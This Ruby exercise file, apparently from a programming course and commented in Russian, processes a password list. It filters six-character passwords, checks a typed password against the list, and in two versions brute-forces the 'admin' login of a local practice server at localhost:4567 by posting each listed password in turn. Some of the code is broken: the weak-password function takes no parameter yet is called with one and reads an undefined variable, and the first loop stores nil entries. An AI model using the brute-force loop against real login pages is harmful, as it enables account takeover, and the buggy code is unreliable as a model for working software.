# 1. Прочитать и вывести на экран все строки из фаила
# 1a Вывести все пароли равные 6 символов
# 1b Вывести это в отдельный фаил
input = File.open("C:/projects/lesson_18/passwords.txt", "r")
	#puts input.read
  arr = []
	while (line = input.gets)
		puts line if line.chomp.size == 6
    str = line if line.chomp.size == 6
    arr << str
	end
input.close

output = File.open("C:/projects/lesson_18/pass_output.txt", "w")
  arr.each do |str|
    output.write(str)
  end
output.close


puts
# 2. Сделать ввод своего пароля и его проверку на уязвимость(уязвимый тот что есть в списке)
input = File.open("passwords.txt", "r")
	arr = []
	while (line = input.gets)
		arr << line.strip
	end
input.close
print 'Enter your password '
pass = gets.strip
puts "#{arr.include?(pass) ? 'Your password is weak' : 'Your password is strong'}"


# 2 VAR2 Проверить с помощью отдельной функции(уязвимый тот что содержит в себе слова из списка)
def its_password_weak?
  input = File.open("passwords.txt", "r")
  	while (line = input.gets)
      if pass.include?(line.strip)
        return true
      end
  	end
  input.close
  false
end

print 'Enter your password '
pass = gets.strip

if its_password_weak?(pass)
  puts 'Your password is weak'
else
  puts 'Your password is strong'
end


puts
# 3. Подбор пароля
require 'net/http'
require 'uri'

Dir.chdir "C:/Projects/lesson_18" # Меняем директорию если это необходимо

def is_wrong_password? password
  uri = URI.parse "http://localhost:4567/login"
  response = Net::HTTP.post_form(uri, username: 'admin', password: password).body
  response.include?('Wrong username or password, please try again')
end

input = File.open("passwords.txt", "r")
  while (line = input.gets)
    print "password #{line.strip} is... "
    if is_wrong_password? line.strip
      puts 'wrong'
    else
      puts "found, password is #{line.strip}"
      break
    end
    puts
  end
input.close

# Версия 2 при помощи each_line
require 'net/http'
require 'uri'

Dir.chdir "C:/Projects/lesson_18" # Меняем директорию если это необходимо

def is_wrong_password? password
  uri = URI.parse "http://localhost:4567/login"
  response = Net::HTTP.post_form(uri, username: 'admin', password: password).body
  response.include?('Wrong username or password, please try again')
end

File.new('passwords.txt').each do |line|
  password = line.chomp
  print "password #{password} is... "
  if is_wrong_password? line.strip
    puts 'wrong'
  else
    puts "found, password is #{password}"
    break
  end
  puts
end
